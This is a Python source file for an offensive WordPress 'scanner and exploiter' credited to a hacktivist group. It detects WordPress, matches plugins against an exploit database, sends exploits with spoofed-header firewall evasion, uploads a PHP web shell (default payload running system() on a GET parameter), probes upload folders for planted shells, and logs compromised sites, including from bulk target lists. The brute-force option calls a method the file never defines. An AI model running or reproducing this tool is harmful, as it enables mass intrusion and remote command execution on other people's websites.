#!/usr/bin/env python3
"""
WordPress Advanced Security Scanner & Exploiter v5.3
WITH LOCAL SHELL FILE SUPPORT
Tools by BCEVM - Hacktivist Indonesia
"""

import requests
import argparse
import os
import re
import sys
import json
import time
import hashlib
import random
import string
from urllib.parse import urlparse, urlencode, quote, unquote
from datetime import datetime
from colorama import init, Fore, Style, Back
import concurrent.futures
import base64

requests.packages.urllib3.disable_warnings()
init(autoreset=True)

BANNER = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════╗
║{Fore.YELLOW}    ██████╗  ██████╗███████╗██╗   ██╗███╗   ███╗    {Fore.RED}       ║
║{Fore.YELLOW}    ██╔══██╗██╔════╝██╔════╝██║   ██║████╗ ████║    {Fore.RED}       ║
║{Fore.YELLOW}    ██████╔╝██║     █████╗  ██║   ██║██╔████╔██║    {Fore.RED}       ║
║{Fore.YELLOW}    ██╔══██╗██║     ██╔══╝  ██║   ██║██║╚██╔╝██║    {Fore.RED}       ║
║{Fore.YELLOW}    ██████╔╝╚██████╗███████╗╚██████╔╝██║ ╚═╝ ██║    {Fore.RED}       ║
║{Fore.CYAN}      WordPress Security Scanner v5.3 (Local Shell)      {Fore.RED}║
║{Fore.WHITE}         Support upload from local file (nana.php)      {Fore.RED}║
║{Fore.GREEN}              Tools by BCEVM - Hacktivist Indonesia      {Fore.RED}║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""

# Path ke exploit_db.json
EXPLOIT_DB_PATH = "exploits/exploit_db.json"

def load_exploit_db(json_path=EXPLOIT_DB_PATH):
    """Load exploit database from JSON file"""
    if os.path.exists(json_path):
        try:
            with open(json_path, 'r') as f:
                db = json.load(f)
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Loaded {len(db)} plugins from {json_path}")
            return db
        except Exception as e:
            print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Error loading {json_path}: {e}")
            return {}
    else:
        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {json_path} not found!")
        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Creating directory exploits/ ...")
        os.makedirs("exploits", exist_ok=True)
        return {}

def load_shell_file(shell_path):
    """Load shell content from local file"""
    if os.path.exists(shell_path):
        try:
            with open(shell_path, 'rb') as f:
                content = f.read()
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Loaded shell from: {shell_path} ({len(content)} bytes)")
            return content
        except Exception as e:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Error loading shell: {e}")
            return None
    else:
        print(f"{Fore.RED}[-]{Style.RESET_ALL} Shell file not found: {shell_path}")
        return None

def get_shell_content(shell_file=None, shell_content=None):
    """Get shell content from file or parameter"""
    if shell_file:
        return load_shell_file(shell_file)
    elif shell_content:
        if shell_content.startswith("base64:"):
            return base64.b64decode(shell_content[7:])
        return shell_content.encode()
    else:
        # Default shell
        default_shell = b"<?php system($_GET['cmd']); ?>"
        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} No shell provided, using default")
        return default_shell

class WordPressScanner:
    def __init__(self, target, shell_file=None, shell_content=None, exploit_db_path=EXPLOIT_DB_PATH, timeout=25, threads=3):
        self.target = self.normalize_target(target)
        self.domain = self.extract_domain(target)
        self.timeout = timeout
        self.threads = threads
        self.shell_content = get_shell_content(shell_file, shell_content)
        self.shell_b64 = base64.b64encode(self.shell_content).decode()
        self.EXPLOIT_DB = load_exploit_db(exploit_db_path)
        
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        })
        self.session.verify = False
        self.results = {
            "target": self.target,
            "wordpress": False,
            "version": None,
            "plugins": [],
            "vulnerable_plugins": [],
            "vulnerabilities": [],
            "exploits": [],
            "shells": [],
            "credentials": [],
            "waf_detected": False,
            "has_vulnerabilities": False
        }
        self.vulnerable = False
    
    def normalize_target(self, url):
        if not url.startswith("http"):
            url = "http://" + url
        return url.rstrip("/")
    
    def extract_domain(self, url):
        parsed = urlparse(url)
        return parsed.netloc or parsed.path
    
    def http_request(self, url, method="GET", data=None, files=None, headers=None, allow_redirects=True, bypass_waf=False):
        """HTTP request dengan WAF bypass techniques"""
        try:
            request_headers = self.session.headers.copy()
            if headers:
                request_headers.update(headers)
            
            if bypass_waf:
                bypass_headers = {
                    "X-Forwarded-For": "127.0.0.1",
                    "X-Real-IP": "127.0.0.1",
                    "X-Originating-IP": "127.0.0.1",
                    "X-Remote-IP": "127.0.0.1",
                    "X-Remote-Addr": "127.0.0.1",
                    "X-Client-IP": "127.0.0.1",
                    "Referer": self.target,
                    "Origin": self.target
                }
                request_headers.update(bypass_headers)
            
            if method.upper() == "GET":
                r = self.session.get(url, timeout=self.timeout, 
                                   allow_redirects=allow_redirects, headers=request_headers)
            elif method.upper() == "POST":
                r = self.session.post(url, data=data, files=files, 
                                    timeout=self.timeout, allow_redirects=allow_redirects, 
                                    headers=request_headers)
            else:
                return "", 0, {}
            
            return r.text, r.status_code, r.headers
        except Exception as e:
            return f"Error: {str(e)[:50]}", 0, {}
    
    def detect_wordpress(self):
        """WordPress detection"""
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Detecting WordPress...")
        
        wp_indicators = []
        protocols = ["http://", "https://"]
        base_domain = self.domain
        
        for protocol in protocols:
            test_url = protocol + base_domain
            html, status, _ = self.http_request(test_url)
            
            if status > 0:
                self.target = test_url.rstrip("/")
                
                patterns = [
                    (r'/wp-content/|/wp-includes/|/wp-json/', "Path references"),
                    (r'wordpress|WordPress', "WordPress mention"),
                    (r'id="wp-"|class="wp-', "WP classes"),
                    (r'content=["\']WordPress', "Generator meta")
                ]
                
                for pattern, desc in patterns:
                    if re.search(pattern, html, re.IGNORECASE):
                        wp_indicators.append(desc)
                
                if wp_indicators:
                    break
        
        check_paths = ["/wp-login.php", "/wp-admin/", "/xmlrpc.php", "/readme.html"]
        for path in check_paths:
            url = self.target + path
            _, status, _ = self.http_request(url)
            if status in [200, 301, 302, 403, 401]:
                wp_indicators.append(path)
        
        self.results["wordpress"] = len(wp_indicators) >= 2
        return wp_indicators
    
    def get_wp_version(self):
        """Get WordPress version"""
        sources = [
            (self.target + "/readme.html", r'Version\s+([\d.]+)'),
            (self.target + "/feed/", r'generator>https://wordpress\.org/\?v=([\d.]+)<'),
            (self.target, r'content="WordPress\s+([\d.]+)"')
        ]
        
        for url, pattern in sources:
            html, status, _ = self.http_request(url)
            if status == 200:
                match = re.search(pattern, html, re.IGNORECASE)
                if match:
                    version = match.group(1)
                    if re.match(r'^\d+(\.\d+)+$', version):
                        self.results["version"] = version
                        return version
        return None
    
    def find_plugins(self):
        """Find plugins"""
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Discovering plugins...")
        
        html, _, _ = self.http_request(self.target)
        plugins = set()
        
        plugin_patterns = [
            r'/wp-content/plugins/([^/"\'>]+)/',
            r'plugins=([^&"\'>]+)'
        ]
        
        for pattern in plugin_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            for match in matches:
                plugin = match.lower().strip()
                if plugin and '.' not in plugin and len(plugin) < 30:
                    plugins.add(plugin)
        
        for plugin in self.EXPLOIT_DB.keys():
            check_url = f"{self.target}/wp-content/plugins/{plugin}/"
            _, status, _ = self.http_request(check_url)
            if status in [200, 301, 302, 403]:
                plugins.add(plugin)
        
        self.results["plugins"] = sorted(list(plugins))
        return self.results["plugins"]
    
    def check_vulnerabilities(self):
        """Check vulnerabilities - hanya yang ada di DB"""
        vulnerabilities = []
        vulnerable_plugins = []
        
        for plugin in self.results["plugins"]:
            plugin_name = plugin.split()[0].lower()
            
            if plugin_name in self.EXPLOIT_DB:
                vulnerable_plugins.append(plugin_name)
                for cve in self.EXPLOIT_DB[plugin_name].get("cves", []):
                    vulnerabilities.append({
                        "plugin": plugin_name,
                        "cve": cve[0] if isinstance(cve, tuple) else cve.get("id", "Unknown"),
                        "severity": cve[1] if isinstance(cve, tuple) else cve.get("severity", "MEDIUM"),
                        "description": cve[2] if isinstance(cve, tuple) else cve.get("description", "")
                    })
        
        self.results["vulnerable_plugins"] = vulnerable_plugins
        self.results["vulnerabilities"] = vulnerabilities
        self.results["has_vulnerabilities"] = len(vulnerabilities) > 0
        self.vulnerable = len(vulnerabilities) > 0
        
        return vulnerabilities
    
    def exploit_with_waf_bypass(self, plugin_name, exploit_name=None):
        """Advanced exploitation dengan shell dari file"""
        if plugin_name not in self.EXPLOIT_DB:
            return False
        
        exploits = self.EXPLOIT_DB[plugin_name].get("exploits", [])
        
        if exploit_name:
            exploit = next((e for e in exploits if e["name"] == exploit_name), None)
            if not exploit:
                return False
            exploits = [exploit]
        
        successful = []
        
        for exploit in exploits:
            print(f"\n{Fore.YELLOW}[!]{Style.RESET_ALL} Testing: {exploit['name']} ({exploit.get('type', 'unknown').upper()})")
            
            url = self.target + exploit.get("path", "/")
            method = exploit.get("method", "GET")
            bypass = exploit.get("waf_bypass", False)
            
            # Update payload dengan shell content
            params = exploit.get("params", {}).copy()
            
            # Replace shell placeholders
            for key, value in params.items():
                if isinstance(value, str):
                    params[key] = value.replace("{{SHELL_B64}}", self.shell_b64)
                    params[key] = params[key].replace("{{SHELL_CONTENT}}", self.shell_content.decode('utf-8', errors='ignore'))
            
            try:
                if method == "POST":
                    files = exploit.get("files", {}).copy()
                    # Update files dengan shell content
                    for field, file_info in files.items():
                        if isinstance(file_info, tuple) and len(file_info) >= 2:
                            filename, content, mime = file_info
                            if content == "{{SHELL_CONTENT}}":
                                files[field] = (filename, self.shell_content, mime)
                    
                    headers = exploit.get("headers", {})
                    
                    if files:
                        content, status, _ = self.http_request(
                            url, method="POST", data=params, 
                            files=files, headers=headers, bypass_waf=bypass
                        )
                    else:
                        content, status, _ = self.http_request(
                            url, method="POST", data=params, 
                            headers=headers, bypass_waf=bypass
                        )
                else:
                    if params:
                        query = urlencode(params, quote_via=quote)
                        url_full = f"{url}?{query}"
                    else:
                        url_full = url
                    
                    headers = exploit.get("headers", {})
                    content, status, _ = self.http_request(url_full, headers=headers, bypass_waf=bypass)
                
                print(f"  URL: {url_full if 'url_full' in locals() else url}")
                print(f"  Status: {status}, Length: {len(content)}")
                
                # Check success indicators
                success = False
                indicators = exploit.get("success_indicators", [])
                for indicator in indicators:
                    if indicator.lower() in content.lower():
                        success = True
                        print(f"  {Fore.GREEN}[+]{Style.RESET_ALL} Indicator found: '{indicator}'")
                        break
                
                result = {
                    "plugin": plugin_name,
                    "exploit": exploit["name"],
                    "url": url_full if 'url_full' in locals() else url,
                    "method": method,
                    "status": status,
                    "length": len(content),
                    "success": success
                }
                
                self.results["exploits"].append(result)
                
                if success:
                    successful.append(result)
                    print(f"  {Fore.GREEN}[✓]{Style.RESET_ALL} EXPLOIT SUCCESSFUL!")
                    
                    # Cari shell yang terupload
                    self.find_uploaded_shells()
                
            except Exception as e:
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Error: {str(e)[:50]}")
        
        return len(successful) > 0
    
    def find_uploaded_shells(self):
        """Cari shell yang mungkin sudah terupload"""
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Checking for uploaded shells...")
        
        shell_names = ["shell.php", "nana.php", "bcevm.php", "cmd.php", "rce.php"]
        locations = [
            "/wp-content/uploads/",
            "/wp-content/uploads/2025/",
            "/wp-content/uploads/2024/",
            "/wp-content/plugins/",
            "/"
        ]
        
        found = False
        for location in locations:
            for shell in shell_names:
                url = self.target + location + shell
                content, status, _ = self.http_request(f"{url}?cmd=echo+SHELL_TEST")
                
                if status == 200 and ('SHELL_TEST' in content or '<?php' in content):
                    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Shell found: {url}")
                    self.results["shells"].append({
                        "url": url,
                        "test": f"{url}?cmd=whoami",
                        "verified": True
                    })
                    found = True
        
        if not found:
            print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} No shell found in common locations")
        
        return found
    
    def scan_all(self):
        """Complete scan"""
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Starting comprehensive scan...")
        print(f"{Fore.WHITE}[=]{Style.RESET_ALL} Target: {self.target}")
        
        indicators = self.detect_wordpress()
        if not self.results["wordpress"]:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} WordPress not detected")
            return self.results
        
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} WordPress detected")
        
        version = self.get_wp_version()
        if version:
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Version: {version}")
        
        plugins = self.find_plugins()
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Plugins found: {len(plugins)}")
        
        vulns = self.check_vulnerabilities()
        if vulns:
            print(f"\n{Fore.RED}[!]{Style.RESET_ALL} VULNERABILITIES FOUND: {len(vulns)}")
            for vuln in vulns:
                color = Fore.RED if vuln["severity"] in ["CRITICAL", "HIGH"] else Fore.YELLOW
                print(f"  {color}• {vuln['plugin']}: {vuln['cve']} ({vuln['severity']}){Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} No vulnerable plugins found")
        
        return self.results
    
    def generate_report(self):
        """Generate report untuk vulnerable target"""
        if not self.vulnerable:
            return None
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"reports/{self.domain}_{timestamp}_vuln.txt"
        os.makedirs("reports", exist_ok=True)
        
        report = [
            "=" * 70,
            "BCEVM WordPress Security Scan - VULNERABLE TARGET REPORT",
            f"Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"Target: {self.target}",
            "=" * 70,
            "",
            "[VULNERABILITIES]",
        ]
        
        for vuln in self.results['vulnerabilities']:
            report.append(f"• {vuln['plugin']} - {vuln['cve']} ({vuln['severity']})")
        
        if self.results['exploits']:
            successful = [e for e in self.results['exploits'] if e.get('success')]
            if successful:
                report.extend(["", "[SUCCESSFUL EXPLOITS]"])
                for exp in successful:
                    report.append(f"✓ {exp['plugin']}/{exp['exploit']}")
                    report.append(f"  URL: {exp['url']}")
        
        if self.results['shells']:
            report.extend(["", "[UPLOADED SHELLS]"])
            for shell in self.results['shells']:
                report.append(f"• {shell['url']}")
        
        report.extend([
            "",
            "=" * 70,
            f"⚠️ VULNERABLE - {len(self.results['vulnerabilities'])} vulnerabilities found",
            "=" * 70
        ])
        
        with open(filename, 'w') as f:
            f.write("\n".join(report))
        
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Report saved: {filename}")
        return filename
    
    def save_vulnerable_target(self, master_file="vulnerable_targets.json"):
        """Simpan target vulnerable ke master file"""
        if not self.vulnerable:
            return False
        
        master_data = []
        if os.path.exists(master_file):
            try:
                with open(master_file, 'r') as f:
                    master_data = json.load(f)
            except:
                pass
        
        entry = {
            "target": self.target,
            "domain": self.domain,
            "timestamp": datetime.now().isoformat(),
            "vulnerabilities": self.results.get("vulnerabilities", []),
            "exploits_successful": len([e for e in self.results.get("exploits", []) if e.get("success")]),
            "has_shell": len(self.results.get("shells", [])) > 0
        }
        
        # Remove duplicate
        master_data = [t for t in master_data if t.get("target") != self.target]
        master_data.append(entry)
        
        with open(master_file, 'w') as f:
            json.dump(master_data, f, indent=2)
        
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Saved to {master_file}")
        return True

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(
        description="BCEVM WordPress Security Scanner v5.3",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Scan with local shell file (nana.php)
  python3 scanner.py https://target.com --shell nana.php --exploit
  
  # Scan multiple targets
  python3 scanner.py -f targets.txt --shell nana.php
  
  # Use custom shell content
  python3 scanner.py https://target.com --shell-content "<?php system($_GET['cmd']); ?>"
  
  # Just scan (no exploit)
  python3 scanner.py https://target.com --scan
        """
    )
    
    parser.add_argument("target", nargs="?", help="Target URL")
    parser.add_argument("-f", "--file", help="Scan targets from file")
    parser.add_argument("--shell", "--shell-file", dest="shell_file", 
                       help="Local shell file to upload (e.g., nana.php)")
    parser.add_argument("--shell-content", help="Shell content as string")
    parser.add_argument("--scan", action="store_true", help="Scan only")
    parser.add_argument("--exploit", action="store_true", help="Exploit vulnerabilities")
    parser.add_argument("--brute", action="store_true", help="Brute force login")
    parser.add_argument("--list-vulns", action="store_true", help="List vulnerable targets")
    
    
    args = parser.parse_args()
    
    # List vulnerable targets
    if args.list_vulns:
        if os.path.exists("vulnerable_targets.json"):
            with open("vulnerable_targets.json", 'r') as f:
                targets = json.load(f)
            print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Vulnerable Targets: {len(targets)}\n")
            for i, t in enumerate(targets, 1):
                print(f"{Fore.RED}[{i}]{Style.RESET_ALL} {t['target']}")
                print(f"    Vulns: {len(t.get('vulnerabilities', []))}")
                print()
        else:
            print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} No vulnerable targets file")
        return
    
    # Handle file input
    if args.file:
        if not os.path.exists(args.file):
            print(f"{Fore.RED}[!]{Style.RESET_ALL} File not found: {args.file}")
            return
        
        with open(args.file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Scanning {len(targets)} targets...")
        
        vulnerable_count = 0
        for target in targets:
            print(f"\n{Fore.YELLOW}[>]{Style.RESET_ALL} Target: {target}")
            
            scanner = WordPressScanner(
                target, 
                shell_file=args.shell_file,
                shell_content=args.shell_content
            )
            scanner.scan_all()
            
            if scanner.vulnerable:
                vulnerable_count += 1
                if args.exploit:
                    for vuln in scanner.results["vulnerabilities"]:
                        scanner.exploit_with_waf_bypass(vuln["plugin"])
                scanner.generate_report()
                scanner.save_vulnerable_target()
            else:
                print(f"{Fore.GREEN}[✓]{Style.RESET_ALL} Clean - no vulnerabilities")
        
        print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} Done! Vulnerable: {vulnerable_count}/{len(targets)}")
        return
    
    if not args.target:
        print(f"{Fore.RED}[!]{Style.RESET_ALL} Please provide target or use -f")
        parser.print_help()
        return
    
    scanner = WordPressScanner(
        args.target,
        shell_file=args.shell_file,
        shell_content=args.shell_content
    )
    scanner.scan_all()
    
    if scanner.vulnerable:
        if args.exploit:
            for vuln in scanner.results["vulnerabilities"]:
                scanner.exploit_with_waf_bypass(vuln["plugin"])
        
        if args.brute:
            scanner.brute_force_login_fast()
        
        scanner.generate_report()
        scanner.save_vulnerable_target()
    else:
        print(f"\n{Fore.GREEN}[✓]{Style.RESET_ALL} Target is CLEAN!")

if __name__ == "__main__":
    main()
